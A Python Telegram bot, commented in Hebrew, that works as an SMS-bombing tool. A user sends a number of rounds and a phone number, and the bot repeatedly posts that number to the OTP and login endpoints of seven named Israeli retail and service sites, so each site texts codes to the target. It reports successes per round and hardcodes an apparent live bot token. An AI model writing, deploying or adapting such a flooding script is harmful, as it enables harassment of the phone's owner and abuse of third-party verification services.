import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- שרת Flask לשמירה על הבוט פעיל ב-Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרת הבוט ---
API_TOKEN = '8788411826:AAG5BMCIL_iNCfgX8kM2f5BIzN6RZtd_C30'
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    apis = [
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"n": "Urbanica", "u": "https://www.urbanica-wh.com/customer/ajax/post/", "d": {"form_key": "1kjI9qhbZ7bPMivW", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Delta", "u": "https://www.delta.co.il/customer/ajax/post/", "d": {"form_key": "vmG08wd94ASHHMPp", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Step In", "u": "https://www.stepin.co.il/customer/ajax/post/", "d": {"form_key": "jzm8zMmOseKijwBO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "8baff678-a092-4f3e-b08d-26adf214696b"}, "type": "json"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}, "type": "json"}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    total_success = 0
    total_fail = 0

    for r in range(int(rounds)):
        round_success = 0
        round_fail = 0
        
        for site in apis:
            try:
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=10)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=10)
                
                if res.status_code == 200:
                    round_success += 1
                else:
                    round_fail += 1
            except:
                round_fail += 1
            
            # דיליי של 0.5 שניות בין הודעה להודעה
            time.sleep(0.5)
        
        total_success += round_success
        total_fail += round_fail
        
        bot.send_message(m.chat.id, f"📊 סבב {r+1} הושלם:\n✅ הצלחות: {round_success}\n❌ נכשלו: {round_fail}")
        
        # השהייה קטנה של 2 שניות בין סבבים כדי לא להעמיס על השרת
        if r < int(rounds) - 1:
            time.sleep(2)

    bot.send_message(m.chat.id, f"🏁 **סיכום סופי לכל הסבבים:**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2:
            rounds = parts[0]
            target = parts[1]
            
            if rounds.isdigit() and target.isdigit() and len(target) >= 9:
                bot.reply_to(m, f"🚀 מתחיל {rounds} סבבים על {target}...\nדיליי: 0.5 שניות בין הודעות.")
                attack(m, target, rounds)
            else:
                bot.reply_to(m, "פורמט לא תקין. שלח למשל: 2 0523365027")
        else:
            bot.reply_to(m, "נא לשלוח בפורמט: [מספר סבבים] [מספר טלפון]")
    except Exception as e:
        bot.reply_to(m, "קרתה שגיאה בהפעלת הסבב.")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
